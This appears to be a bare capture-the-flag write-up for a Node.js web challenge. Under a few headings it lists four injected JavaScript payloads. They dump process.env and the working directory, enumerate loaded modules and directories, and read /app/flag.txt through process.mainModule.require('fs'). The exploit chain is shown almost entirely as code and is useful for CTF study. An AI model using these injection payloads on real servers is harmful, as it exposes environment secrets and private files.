** Node js question

** Websit view

** source code analysis

**solution
1,(a => process.env)(), (a => process.cwd())(), (a => process.mainModule)()

2, (a => process.mainModule.children.map(child => child.filename))()

3,(a => process.mainModule.require('fs').readdirSync('/app/..'))()

4,(a => process.mainModule.require('fs').readFileSync('/app/flag.txt', 'utf-8'))()
